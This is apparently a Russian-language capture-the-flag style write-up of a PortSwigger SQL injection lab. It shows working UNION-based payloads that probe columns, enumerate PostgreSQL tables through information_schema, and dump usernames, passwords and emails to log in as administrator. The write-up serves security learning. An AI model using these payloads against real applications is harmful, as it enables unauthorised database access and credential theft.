---
title: "SQL injection attack, listing the database contents on non-Oracle databases"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle"
classes: wide
---

В данной лабе есть уязвимый к `SQL injection` фильтр категории. Для решения нужно получить учетные данные администратора и залогиниться от его имени.

```
https://0a8a00d103c143f285ba801000a10039.web-security-academy.net/
```

## Solution

Такс, ну из условия известно, что уязвимость в фильтре категорий. Возьму `URL` с фильтром для `Gifts`:

```
https://0a8a00d103c143f285ba801000a10039.web-security-academy.net/filter?category=Gifts
```


Время подбирать обрамление. Из моего опыта с лабами предположу, что тут снова одинарная кавычка) Попробую следующий пейлоад:

```
Gifts' and false-- -
```

Если страница ломается или возвращает другую страницу — значит SQL-инъекция сработала. Все так:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/1.png){: height="200" .align-center}
  

Скорее всего 2 колонки в запросе. Поэтому попробую `ORDERY BY 3` и `ORDER BY 2`:

```
Gifts' and false ORDER BY 3-- -Error
Gifts' and false ORDER BY 2-- -Ok
```

<details>
<summary>Пояснение</summary> 
  
<strong>ORDER BY N</strong> в SQL-запросe: если <strong>N</strong> превышает реальное количество столбцов — БД вернёт ошибку, если <strong>N</strong> корректно — запрос выполнится без ошибок.

</details>


Теперь нужно получить информацию о БД. Для этого буду использовать `UNION` в пейлоаде:

```
Gifts' and false UNION SELECT 1, 2-- -Error
Gifts' and false UNION SELECT '1', '2'-- -
```

<details>
<summary>Пояснение</summary> 
  
<strong>UNION SELECT</strong> — это оператор в SQL, который объединяет результаты <strong>SELECT</strong>-запросов в один. Когда веб-приложение вставляет данные пользователя в **SQL-запрос** без фильтрации или экранирования, можно добавить
<strong>UNION SELECT</strong> к своему вводу, чтобы вытянуть данные из других таблиц, даже если они не должны быть показаны. В данном решении выбираются ранее обнаруженные колонки.

</details>


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/2.png){: height="200" .align-center}


Теперь буду получать информацию о БД:

```
Gifts' and false UNION SELECT database(), version()-- -Error
Gifts' and false UNION SELECT '1', version()-- -
```

<details>
<summary>Пояснение</summary> 
  
Это важно, потому что системные таблицы отличаются в <strong>MySQL</strong>, <strong>PostgreSQL</strong> и <strong>Oracle</strong>.

</details>


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/3.png){: height="200" .align-center}


У меня БД `PostgreSQL 12.20`.  


Теперь нужно вытащить доступные таблицы из системной таблицы `informaiton_schema`:

```
Gifts' and false UNION SELECT table_name, NULL FROM information_schema.tables-- -
```

<details>
<summary>Пояснение</summary> 
  
<strong>information_schema</strong> — служебные таблицы, содержащие метаинформацию (про таблицы, поля и т.д.).

</details>

Я получил список всех таблиц:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/4.png){: height="200" .align-center}


С помощью поиска на странице я нашел таблицу `users_uajicb`. Попробую поработать с ней.


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/5.png){: height="200" .align-center}


Вытащу доступные колонки из нее:

```
Gifts' and false UNION SELECT 'columns', column_name FROM information_schema.columns WHERE table_name = 'users_uajicb'-- -
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/6.png){: height="200" .align-center}


Я узнал, что в таблице `users_uajicb` содержатся следующие колонки: `email`, `password_fiazmh`, `username_gwsbij`. Теперь выведу их содержимое с помощью следующего пейлоада:

```
Gifts' and false UNION SELECT username_gwsbij, concat(username_gwsbij, ':', password_fiazmh, ':', email) FROM users_uajicb-- -
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/7.png){: height="200" .align-center}


Зайду в аккаунт администратора:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_listing_the_database_contents_on_non-Oracle_databases/8.png){: height="200" .align-center}


Пуф. Лаба пройдена:3 ☕ 